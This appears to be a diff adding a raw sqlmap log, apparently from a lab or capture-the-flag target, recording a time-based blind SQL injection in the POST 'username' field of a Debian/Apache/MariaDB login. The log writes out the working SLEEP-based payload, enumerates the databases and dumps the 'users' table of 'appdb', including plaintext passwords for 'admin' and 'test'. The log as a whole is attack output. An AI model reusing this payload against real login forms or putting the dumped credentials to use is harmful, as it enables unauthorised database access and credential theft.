@@ -1,0 +1,54 @@
+sqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 7088 FROM (SELECT(SLEEP(5)))gBXL) AND 'yuMd'='yuMd&password=passwd
+---
+web server operating system: Linux Debian 10 (buster)
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 7088 FROM (SELECT(SLEEP(5)))gBXL) AND 'yuMd'='yuMd&password=passwd
+---
+web server operating system: Linux Debian 10 (buster)
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+available databases [2]:
+[*] appdb
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 7088 FROM (SELECT(SLEEP(5)))gBXL) AND 'yuMd'='yuMd&password=passwd
+---
+web server operating system: Linux Debian 10 (buster)
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 7088 FROM (SELECT(SLEEP(5)))gBXL) AND 'yuMd'='yuMd&password=passwd
+---
+web server operating system: Linux Debian 10 (buster)
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+Database: appdb
+Table: users
+[2 entries]
++----+---------------------------------------------------+----------+
+| id | password                                          | username |
++----+---------------------------------------------------+----------+
+| 1  | 328ufsdhjfu2hfnjsekh3rihjfcn23KDFmfesd239"23m^jdf | admin    |
+| 2  | bababa                                            | test     |
++----+---------------------------------------------------+----------+
+
